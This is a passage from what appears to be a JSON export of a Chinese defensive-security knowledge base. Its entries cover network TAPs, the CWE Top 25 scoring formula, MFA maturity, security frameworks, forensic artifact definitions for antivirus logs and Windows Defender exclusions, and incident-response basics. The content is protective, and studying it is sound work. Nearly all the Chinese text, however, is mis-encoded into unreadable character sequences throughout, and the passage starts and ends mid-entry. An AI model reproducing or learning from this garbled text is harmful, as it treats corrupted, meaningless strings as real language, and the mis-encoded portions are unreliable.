â†’ where electricity is used to move electrons (instead of photons)\r\n    3. Signal conversions â†’ since an active TAP regenerates the signal anyway, it can also be designed to create a signal of a different type (such as 10Gb SR converted to 10Gb LR)\r\n    4. SFP-based links that cannot otherwise be broken (such as TwinAX cabling) â†’ regeneration works here as well\r\n- **è™šæ‹ŸTAP**\r\n  - ç”¨äºç½‘ç»œåŠŸèƒ½è™šæ‹ŸåŒ– (NFV) ä»¥åŠç§æœ‰å’Œå…¬å…±äº‘åŸºç¡€æ¶æ„ï¼Œä»¥è®¿é—®æ‰˜ç®¡ç¯å¢ƒä¸­çš„ä¸œè¥¿å‘å’Œå—åŒ—å‘æµé‡ã€‚\r\n  - ![hKxsTy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/hKxsTy.jpg)\r\n\r\n# 4. å‚è€ƒèµ„æ–™\r\n- [https://www.gigamon.com/resources/resource-library/white-paper/to-tap-or-to-span.html](https://www.gigamon.com/resources/resource-library/white-paper/to-tap-or-to-span.html)\r\n- [https://www.gigamon.com/resources/resource-library/white-paper/understanding-network-taps-first-step-to-visibility.html](https://www.gigamon.com/resources/resource-library/white-paper/understanding-network-taps-first-step-to-visibility.html)\r\n- [https://www.secrss.com/articles/12651](https://www.secrss.com/articles/12651)\r\n- [http://blog.nsfocus.net/east-west-flow-sum](http://blog.nsfocus.net/east-west-flow-sum)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å®‰å…¨è§„èŒƒ&æ¨¡å‹/2021 CWE Top 25 è½¯ä»¶è„†å¼±ç‚¹/","title":"2021 CWE Top 25 è½¯ä»¶è„†å¼±ç‚¹"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 2021 CWE Top 25 è½¯ä»¶è„†å¼±ç‚¹\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å®‰å…¨è§„èŒƒ&æ¨¡å‹\r\n- MITRE\r\n- CWE\r\n---\r\n\r\n# èƒŒæ™¯\r\n- CWEçš„å…¨ç§°æ˜¯Common Weakness Enumerationï¼Œåˆ—ä¸¾äº†è¿‡å»ä¸¤å¹´ä¸­é‡åˆ°çš„æœ€å¸¸è§å’Œå½±å“æœ€å¤§çš„è½¯ä»¶å®‰å…¨é—®é¢˜ã€‚è¿™äº›è„†å¼±ç‚¹é€šå¸¸å¾ˆå®¹æ˜“è¢«å‘ç°ã€åˆ©ç”¨ï¼Œå¹¶ä¸”å¯ä»¥è®©æ”»å‡»è€…å®Œå…¨æ¥ç®¡ç³»ç»Ÿã€çªƒå–æ•°æ®ã€‚ CWE Top 25 æ˜¯ä¸€ä¸ªå®è´µçš„ç¤¾åŒºèµ„æºï¼Œå¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜ã€æµ‹è¯•äººå‘˜å’Œç”¨æˆ·â€”â€”ä»¥åŠé¡¹ç›®ç»ç†ã€å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ•™è‚²å·¥ä½œè€…â€”â€”æ·±å…¥äº†è§£æœ€ä¸¥é‡å’Œå½“å‰çš„å®‰å…¨æ¼æ´ã€‚ ^eb3843\r\n- CWE å›¢é˜Ÿåˆ©ç”¨äº†ç¾å›½å›½å®¶æ ‡å‡†ä¸æŠ€æœ¯ç ”ç©¶é™¢ (NIST) å›½å®¶æ¼æ´æ•°æ®åº“ (NVD) ä¸­çš„CVEæ•°æ®ä»¥åŠCVSSåˆ†æ•°ä¸æ¯ä¸ª CVE è®°å½•ç›¸å…³è”ã€‚å°†å…¬å¼åº”ç”¨äºæ•°æ®ï¼Œæ ¹æ®å‡ºç°æ¦‚ç‡å’Œä¸¥é‡ç¨‹åº¦å¯¹æ¯ä¸ªè„†å¼±ç‚¹è¿›è¡Œè¯„åˆ†ã€‚\r\n\r\n# The CWE Top 25\r\n![xAZXnh](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xAZXnh.jpg)\r\n\r\n- è®¡ç®—å…¬å¼\r\n  - è¯„åˆ†å…¬å¼ç”¨äºè®¡ç®—è„†å¼±ç‚¹çš„æ’åºé¡ºåºï¼Œè¯¥é¡ºåºè€ƒè™‘äº†æ¼æ´å‡ºç°çš„é¢‘ç‡ä¸ä¸¥é‡ç¨‹åº¦ï¼Œå¹¶å¯¹æœ€å°å€¼å’Œæœ€å¤§å€¼è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚\r\n  - **ä¸ºäº†ç¡®å®šé¢‘ç‡ï¼Œè¯„åˆ†å…¬å¼è®¡ç®— CWE æ˜ å°„åˆ° NVD å†…çš„ CVE çš„æ¬¡æ•°ï¼š**\r\n    - Freq = {count(CWE_Xâ€™ âˆˆ NVD) for each CWE_Xâ€™ in NVD}\r\n    - Fr(CWE_X) = (count(CWE_X âˆˆ NVD) - min(Freq)) / (max(Freq) - min(Freq))\r\n  - **è¯„åˆ†å…¬å¼ä¸­çš„å¦ä¸€ä¸ªç»„æˆéƒ¨åˆ†æ˜¯ä¸¥é‡ç¨‹åº¦ï¼Œå®ƒç”±æ˜ å°„åˆ°ç‰¹å®š CWE çš„æ‰€æœ‰ CVE çš„å¹³å‡ CVSS åˆ†æ•°è¡¨ç¤ºã€‚ ä¸‹é¢çš„ç­‰å¼ç”¨äºè®¡ç®—è¯¥å€¼ï¼š**\r\n    - Sv(CWE_X) = (average_CVSS_for_CWE_X - min(CVSS)) / (max(CVSS) - min(CVSS))\r\n  - **ç„¶åé€šè¿‡å°†ä¸¥é‡ç¨‹åº¦çš„åˆ†æ•°ä¹˜ä»¥é¢‘ç‡åˆ†æ•°æ¥ç¡®å®šç‰¹å®š CWE å‘ˆç°çš„æ’åºåˆ†æ•°ï¼š**\r\n    - Score(CWE_X) = Fr(CWE_X) * Sv(CWE_X) * 100\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [http://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html](http://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å®‰å…¨è§„èŒƒ&æ¨¡å‹/è®¤è¯å¼ºåº¦æˆç†Ÿåº¦æ¨¡å‹ CASMM/","title":"è®¤è¯å¼ºåº¦æˆç†Ÿåº¦æ¨¡å‹ CASMM"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: è®¤è¯å¼ºåº¦æˆç†Ÿåº¦æ¨¡å‹ CASMM\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å®‰å…¨è§„èŒƒ&æ¨¡å‹\r\n- CASMM\r\n---\r\n\r\n# å¹¶éæ‰€æœ‰çš„ MFA éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»–ä»¬çš„å·®å¼‚åœ¨äº\r\n- ![uSISdK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uSISdK.jpg)\r\n- ç°åœ¨ï¼Œè¶Šæ¥è¶Šå¤šçš„é’“é±¼æ”»å‡»ä¸ä»…æç¤ºè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿˜æç¤ºè¾“å…¥ MFA ä¿¡æ¯ã€‚è¿™æ„å‘³ç€ä¼ ç»Ÿçš„ MFA åœ¨é€æ¸å¤±æ•ˆã€‚è¿™å°±æå‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼šæ˜¯å¦æœ‰ä¸€ç§èº«ä»½éªŒè¯æ–¹æ³•å¯ä»¥é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Ÿæ¢å¥è¯è¯´ï¼Œæ˜¯å¦æœ‰ä¸€ç§å¤šå› ç´ è®¤è¯æ¨¡å¼å¯ä»¥æŠµæŠ—ç½‘ç»œé’“é±¼ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚\r\n- FIDO ä»£è¡¨ Fast Identity Onlineï¼Œå®ƒä½¿ç”¨é€šç”¨èº«ä»½éªŒè¯æ¡†æ¶ (UAF) å’Œé€šç”¨ç¬¬äºŒå› ç´  (U2F) åè®®ã€‚è¯¥ç³»ç»Ÿä½¿ç”¨å…¬é’¥åŠ å¯†å’Œç‰©ç†è®¿é—®ä»¤ç‰Œã€‚ç§é’¥å­˜å‚¨åœ¨ä»¤ç‰Œä¸Šå¹¶éšèº«æºå¸¦ï¼Œè€Œå…¬é’¥å­˜å‚¨åœ¨æ‚¨è¦å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯çš„æœåŠ¡ä¸­ã€‚å½“è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå‘å®¢æˆ·ç«¯/tokenè¯æ˜ä½ å°±æ˜¯ä½ ï¼ˆæŒ‡çº¹ã€PINã€è¯­éŸ³ç­‰ï¼‰ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯ä¼šåˆ›å»ºä¸€ä¸ªå‘é€åˆ°æœåŠ¡çš„ç­¾åè¯·æ±‚ã€‚ä½¿ç”¨å…¬é’¥å¯¹è¯¥è¯·æ±‚è¿›è¡Œè§£å¯†å’Œèº«ä»½éªŒè¯ï¼Œè¿™è¯æ˜è¯¥è¯·æ±‚æ˜¯ä½¿ç”¨ç§é’¥å‘å‡ºçš„ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡èº«ä»½éªŒè¯ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://danielmiessler.com/blog/casmm-consumer-authentication-security-maturity-model/](https://danielmiessler.com/blog/casmm-consumer-authentication-security-maturity-model/)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å®‰å…¨æ¶æ„/å¦‚ä½•é€‰æ‹©ç½‘ç»œå®‰å…¨æ¡†æ¶/","title":"å¦‚ä½•é€‰æ‹©ç½‘ç»œå®‰å…¨æ¡†æ¶"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å¦‚ä½•é€‰æ‹©ç½‘ç»œå®‰å…¨æ¡†æ¶\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å®‰å…¨æ¶æ„\r\n- Lapsus$\r\n- Conti\r\n- SolarWinds\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nå½“è€æ¿æå‡ºçµé­‚æ‹·é—®æ—¶ï¼Œæˆ‘ä»¬èƒ½å¦ä»å®¹å›ç­”ï¼Ÿ\r\n\r\n- [[Lapsus$ç»„ç»‡çš„æ‰‹æ³•]] | [[å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti]] | [[SolarWindsäº‹ä»¶]] ç­‰ç­‰å›å‘ç”Ÿåœ¨æˆ‘ä»¬èº«ä¸Šå—ï¼Ÿæˆ‘ä»¬çš„é£é™©æœ‰å¤šå¤§ï¼Ÿæˆ‘ä»¬æ˜¯å¦èƒ½ä¿æŠ¤äº†æˆ‘ä»¬çš„å…³é”®èµ„äº§ï¼Ÿæœªæ¥æˆ‘ä»¬éœ€è¦åšä»€ä¹ˆï¼Ÿç½‘ç»œå®‰å…¨å¦‚ä½•ä¸ä¸šåŠ¡æˆ˜ç•¥ä¿æŒä¸€è‡´ï¼Ÿ\r\n\r\næˆ‘ä»¬å¯ä»¥ååŠ©ç½‘ç»œå®‰å…¨æ¡†æ¶æ¥å›ç­”è¿™äº›æŒ‘æˆ˜\r\n\r\n# 2. æ¡†æ¶æ¦‚è¿°\r\næˆ‘ä»¬å¯ä»¥æŠŠæ¡†æ¶åˆ†ä¸ºä¸‰ç±»\r\n- **æ§åˆ¶æ¡†æ¶ Control Framework**\r\n  > ç±»æ¯”ï¼šå¦‚æœä½ æƒ³æˆä¸ºä¸€åä½œå®¶ï¼Œå°±å¿…é¡»é¦–å…ˆä»å¯¹è¯­è¨€å’Œè¯æ±‡çš„æŒæ¡å¼€å§‹ï¼Œå¯ä»¥åœ¨å†™ä½œä¸­ä½¿ç”¨çš„å•è¯éƒ½åŒ…å«åœ¨å­—å…¸ä¸­ã€‚åŒæ ·ï¼Œå¯ä»¥å®ç°çš„å®‰å…¨æ§åˆ¶éƒ½åœ¨å„ç§æ§åˆ¶æ¡†æ¶ä¸­éƒ½æœ‰æè¿°ã€‚\r\n  \r\n  - NIST 800-53\r\n    - åŒ…å«æ‚¨å¯èƒ½æƒ³è¦å®æ–½çš„æ‰€æœ‰å¯èƒ½çš„å®‰å…¨æ§åˆ¶ã€‚æ˜¾ç„¶ï¼Œä¸èƒ½ä¹Ÿä¸æƒ³å®ç°æ¯ä¸€ä¸ªå¯èƒ½çš„æ§åˆ¶ã€‚è¿™å°±æ˜¯ NIST 800-53 å°†æ§åˆ¶åˆ†ä¸ºä½ã€ä¸­å’Œé«˜å½±å“ç±»åˆ«çš„åŸå› ï¼Œä»¥ä¾¿å¯ä»¥æ ¹æ®è‡ªå·±çš„æƒ…å†µç¡®å®šé€‚å½“çš„æ§åˆ¶ã€‚\r\n    \r\n  - CIS Controls\r\n    - ä»–ä»¬å®šä¹‰äº†â€œå‰ 20 åâ€æ§åˆ¶æªæ–½ï¼Œè¿™äº›æ§åˆ¶æªæ–½å·²è¢«è¯æ˜å¯ä»¥ç¼“è§£ç»å¤§å¤šæ•°æœ€å¸¸è§å’Œæœ€æœ‰å½±å“åŠ›çš„å®‰å…¨æ”»å‡»ã€‚\r\n- **è®¡åˆ’æ¡†æ¶ Program Framework**\r\n  > ç±»æ¯”ï¼šä½œå®¶ä¸ä¼šä»…ä»…é€šè¿‡ä½¿ç”¨å­—å…¸ä¸­æœ€å¸¸è§çš„å•è¯è€Œè·å¾—æˆåŠŸï¼Œä»–éœ€è¦çŸ¥é“å¦‚ä½•ä»¥ä»¤ä»–çš„è¯»è€…æ»¡æ„çš„æ–¹å¼å°†è¿™äº›è¯ç»„åˆåœ¨ä¸€èµ·ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–å¯èƒ½éœ€è¦ä¸€ä¸ªé£æ ¼æŒ‡å—ä½œä¸ºç¼–å†™æ–‡æ¡£çš„å‚è€ƒç‚¹ã€‚è®¡åˆ’æ¡†æ¶å°±åƒä¸€ä¸ªé£æ ¼æŒ‡å—ã€‚\r\n\r\n  - ISO 27001\r\n    - ä¸€ä¸ªå…¨é¢çš„è®¡åˆ’æ¡†æ¶ï¼Œå®ƒå®šä¹‰äº†å»ºç«‹ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ (ISMS) çš„è¦æ±‚ã€‚åŒ…æ‹¬åº”è¯¥å®æ–½çš„å®‰å…¨æ§åˆ¶ä¹‹å¤–çš„æ”¿ç­–ã€è¿‡ç¨‹ã€æµç¨‹å’Œæ´»åŠ¨ã€‚\r\n\r\n  - NIST CSF\r\n    - å®ƒå®šä¹‰äº†äº”ä¸ªé«˜çº§åŠŸèƒ½ï¼šè¯†åˆ«ã€ä¿æŠ¤ã€æ£€æµ‹ã€å“åº”å’Œæ¢å¤ã€‚è¿™äº”ä¸ªåŠŸèƒ½å°†å¤æ‚çš„å®‰å…¨ä¸–ç•Œåˆ†è§£ä¸ºç®€å•çš„ç±»åˆ«ï¼Œè¿™äº›ç±»åˆ«ä¸ºæ‰€æœ‰å®‰å…¨æ´»åŠ¨çš„é«˜çº§ç”Ÿå‘½å‘¨æœŸå»ºæ¨¡ã€‚å› ä¸ºå®ƒå¾ˆç®€å•ï¼Œæ‰€ä»¥å®ƒè¿˜ä¸ºå®‰å…¨é¢†å¯¼è€…æä¾›äº†ä¸€ç§æ›´è½»æ¾åœ°å°±å…¶å®‰å…¨è®¡åˆ’è¿›è¡Œæ²Ÿé€šçš„æ–¹å¼ã€‚\r\n    - [[Google Cloud å®‰å…¨æ¶æ„]] å°±åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†ä»–ã€‚\r\n\r\n- **é£é™©æ¡†æ¶ Risk Framework**\r\n  > ç±»æ¯”ï¼šä¸€ä¸ªç†Ÿç»ƒçš„ä½œè€…çŸ¥é“å¦‚ä½•è®²è¿°ä¸€ä¸ªèƒ½å¼•èµ·è§‚ä¼—å…±é¸£çš„æ•…äº‹ã€‚åŒæ ·ï¼Œé£é™©æ¡†æ¶å¯å¸®åŠ©å®‰å…¨é¢†å¯¼è€…ä»¥ä¸ä¸šåŠ¡äº§ç”Ÿå…±é¸£çš„æ–¹å¼è¯„ä¼°å’Œç®¡ç†é£é™©ã€‚\r\n\r\n  - IOS 27005\r\n  - NIST 800-30/37/39\r\n  - FAIR\r\n\r\n# 3. å…¨æ™¯å›¾\r\n![r6ctjW](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/r6ctjW.jpg)\r\n\r\n# 4. å®æˆ˜æ¡ˆä¾‹\r\n- #å¾…è¡¥å……\r\n\r\n# 5. å‚è€ƒ\r\n- [https://www.frankkim.net/blog/how-to-make-sense-of-cybersecurity-frameworks](https://www.frankkim.net/blog/how-to-make-sense-of-cybersecurity-frameworks)\r\n- [https://www.youtube.com/watch?v=dt2IqidgpS4](https://www.youtube.com/watch?v=dt2IqidgpS4)\r\n- [https://paleocruiser.medium.com/how-to-choose-a-cybersecurity-framework-431da08d5d81](https://paleocruiser.medium.com/how-to-choose-a-cybersecurity-framework-431da08d5d81)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[Lapsus$ç»„ç»‡çš„æ‰‹æ³•]: ../../å®è·µå‚è€ƒ/Lapsus$ç»„ç»‡çš„æ‰‹æ³•.md \"Lapsus$ç»„ç»‡çš„æ‰‹æ³•\"\r\n[å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti]: ../../å®è·µå‚è€ƒ/å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti.md \"å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti\"\r\n[SolarWindsäº‹ä»¶]: ../../å®è·µå‚è€ƒ/SolarWindsäº‹ä»¶.md \"SolarWindsäº‹ä»¶\"\r\n[Google Cloud å®‰å…¨æ¶æ„]: ../../è¡Œä¸šè§‚å¯Ÿ/Google/Google Cloud å®‰å…¨æ¶æ„.md \"Google Cloud å®‰å…¨æ¶æ„\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/åº”æ€¥å“åº”/Windows.Linux.MacOS Cheat Sheet/","title":"Windows.Linux.MacOS Cheat Sheet"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Windows.Linux.MacOS Cheat Sheet\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- åº”æ€¥å“åº”\r\n- Cheat Sheet\r\n---\r\n\r\n# 1. ç›®å½•åˆ—è¡¨\r\n![x87oqi](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/x87oqi.jpg)\r\n\r\n# 2. å‚è€ƒèµ„æ–™\r\n- [https://www.jaiminton.com/cheatsheet/DFIR](https://www.jaiminton.com/cheatsheet/DFIR)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/åº”æ€¥å“åº”/å¸¸ç”¨ç›®å½•/","title":"å¸¸ç”¨ç›®å½•"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å¸¸ç”¨ç›®å½•\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- åº”æ€¥å“åº”\r\n---\r\n\r\n# 1. ç›®å½•åˆ—è¡¨\r\n```\r\n  antivirus.yaml \r\n  applications.yaml \r\n  cloud_services.yaml \r\n  config_files.yaml \r\n  containerd.yaml \r\n  docker.yaml \r\n  hadoop.yaml \r\n  installed_modules.yaml \r\n  instant_messaging.yaml \r\n  java.yaml \r\n  kaspersky_careto.yaml \r\n  kubernetes.yaml \r\n  legacy.yaml \r\n  linux.yaml \r\n  linux_proc.yaml \r\n  macos.yaml \r\n  ntfs.yaml \r\n  tomcat.yaml \r\n  unix_common.yaml \r\n  webbrowser.yaml \r\n  webservers.yaml \r\n  windows.yaml \r\n  windows_dll_hijacking.yaml \r\n  wmi.yaml\r\n```\r\n\r\n# 2. æ¡ˆä¾‹ â€” antivirus.yamlå†…å®¹å¦‚ä¸‹ï¼š\r\n```\r\n  # Anti-Virus artifacts.\r\n  \r\n  name: EsetAVQuarantine\r\n  doc: Eset Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Library/Application Support/ESET/esets/cache/quarantine/*']}\r\n  supported_os: [Darwin]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: MicrosoftAVQuarantine\r\n  doc: Microsoft Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Microsoft Antimalware\\Quarantine\\**'\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Quarantine\\**'\r\n      separator: '\\'\r\n  supported_os: [Windows]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: MicrosoftAVLogs\r\n  doc: Microsoft Anti-Virus log files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Support\\MPLog-*.log'\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Support\\MPDetection-*.log'\r\n      separator: '\\'\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: WindowsDefenderExclusions\r\n  doc: |\r\n    Directories, processes and extensions configured not to be scanned by Windows Defender.\r\n    The can be set locally or through group policy objects (GPO).\r\n  \r\n    Certain malware families (for example, Tofsee) are known to add directories to the\r\n    Paths list in order to avoid being detected by Windows Defender. Other malware\r\n    (for example, REvil) use the existing exclusions to be ignored by Anti-Virus products.\r\n  sources:\r\n  - type: REGISTRY_KEY\r\n    attributes:\r\n      keys:\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Processes\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\TemporaryPaths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\TemporaryPaths\\*'\r\n  supported_os: [Windows]\r\n  urls:\r\n  - 'https://blog.malwarebytes.com/detections/pum-optional-msexclusion/'\r\n  - 'https://answers.microsoft.com/en-us/protect/forum/all/windows-defender-how-to-remove-exclusions/2a0cc465-97b2-46ea-ae77-b87075ed124e'\r\n  - 'https://blog.talosintelligence.com/2019/05/threat-roundup-0503-0510.html'\r\n  - 'https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/'\r\n  ---\r\n  name: SophosAVLogs\r\n  doc: Sophos Anti-Virus log files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Library/Logs/Sophos*.log']}\r\n    supported_os: [Darwin]\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Sophos\\Sophos Anti-Virus\\Logs\\*']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Darwin, Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: SophosAVQuarantine\r\n  doc: Sophos Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Users/Shared/Infected/*']}\r\n    supported_os: [Darwin]\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Sophos\\Sophos Anti-Virus\\INFECTED\\*']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Darwin, Windows]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: SymantecAVLogs\r\n  doc: Symantec Anti-Virus Log Files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\*\\Data\\Logs\\*.log'\r\n      - '%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\*\\Data\\Logs\\AV\\*.log'\r\n      - '%%users.localappdata%%\\Symantec\\Symantec Endpoint Protection\\Logs\\*.log'\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: SymantecAVQuarantine\r\n  doc: Symantec Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\**5\\*.vbn']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n```\r\n\r\n# 3. ä½¿ç”¨\r\n```\r\n  $WindowsArtifacts=$(curl https://raw.githubusercontent.com/ForensicArtifacts/artifacts/master/data/windows.yaml)\r\n  $obj = ConvertFrom-Yaml $WindowsArtifacts.Content -AllDocuments\r\n  \r\n  $count=0;\r\n  foreach ($Artifact in $obj){\r\n  $Artifacts = [pscustomobject][ordered]@{\r\n  \tName = $obj.name[$count]\r\n  \tDescription = $obj.doc[$count]\r\n  \tReferences = $obj.urls[$count]\r\n  \tAttributes = $obj.sources.attributes[$count]\r\n  }\r\n  $count++;\r\n  $Artifacts | FL;\r\n  }\r\n```\r\n\r\n# 4. å‚è€ƒèµ„æ–™\r\n- [https://www.jaiminton.com/cheatsheet/DFIR/#disclaimer](https://www.jaiminton.com/cheatsheet/DFIR/#disclaimer)\r\n- [https://github.com/ForensicArtifacts/artifacts/tree/main/data](https://github.com/ForensicArtifacts/artifacts/tree/main/data)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/åº”æ€¥å“åº”/åº”æ€¥å“åº”æ–¹æ³•è®º&æ¡†æ¶/","title":"åº”æ€¥å“åº”æ–¹æ³•è®º&æ¡†æ¶"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: åº”æ€¥å“åº”æ–¹æ³•è®º&æ¡†æ¶\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- åº”æ€¥å“åº”\r\n- æ–¹æ³•è®º\r\n- æ¡†æ¶\r\n- NIST\r\n- Microsoft\r\n- AWS\r\n---\r\n\r\n#  1. è¡Œä¸šè§„èŒƒ\r\nNIST Computer Security Incident Handling Guide\r\n\r\n- ![0Pwx5l](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/0Pwx5l.jpg)\r\n- åº”æ€¥å“åº”æ˜¯ä¸€ç»„ç”¨äºåœ¨å‘ç”Ÿå®‰å…¨äº‹ä»¶æ—¶**å‡†å¤‡ã€æ£€æµ‹ã€æ§åˆ¶ã€å“åº”å’Œå­¦ä¹ çš„è¿‡ç¨‹ç®¡ç†ã€‚**\r\n- äº‹ä»¶å“åº”ï¼ˆä¸å¤§å¤šæ•°ç½‘ç»œé˜²å¾¡ä¸€æ ·ï¼‰ç”±ä¸‰å¤§æ”¯æŸ±æ”¯æ’‘ï¼š**æŠ€æœ¯ã€äººå‘˜å’Œæµç¨‹ã€‚**\r\n- **å®‰å…¨äº‹ä»¶å‘ç”Ÿåï¼Œä¸šåŠ¡çš„ä¸»è¦ç›®æ ‡æ˜¯å°½å¿«ä»¥å®‰å…¨çš„æ–¹å¼æ¢å¤æ­£å¸¸ã€‚**\r\n- æˆ‘ä»¬å¯èƒ½å¿…é¡»å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š\r\n  - ä»€ä¹ˆè¢«æ§åˆ¶/æ³„éœ²/ç ´åäº†ï¼Ÿ\r\n  - å¦‚ä½•æ¢å¤æ­£å¸¸ï¼Ÿ\r\n  - è¿™æ˜¯æ€ä¹ˆå‘ç”Ÿçš„ï¼Ÿ\r\n  - æˆ‘ä»¬å¦‚ä½•é˜²æ­¢è¿™ç§æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Ÿ\r\n- è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”¨æ¥è¡¡é‡åº”æ€¥å“åº”å›¢é˜Ÿç»©æ•ˆçš„**å…³é”®æŒ‡æ ‡æ˜¯MTTDå’ŒMTTR**çš„åŸå› ï¼š\r\n  - **MTTDå¹³å‡æ£€æµ‹æ—¶é—´ï¼š**å‘ç°äº‹ä»¶æ­£åœ¨å‘ç”Ÿæ‰€éœ€çš„æ—¶é—´ã€‚\r\n  - **MTTRå¹³å‡å“åº”æ—¶é—´ï¼š**ä¿®å¤å¨èƒæ‰€éœ€çš„æ—¶é—´ã€‚\r\n- **æ•´ä½“æµç¨‹å¯ä»¥åˆ†ä¸ºï¼š**\r\n  - 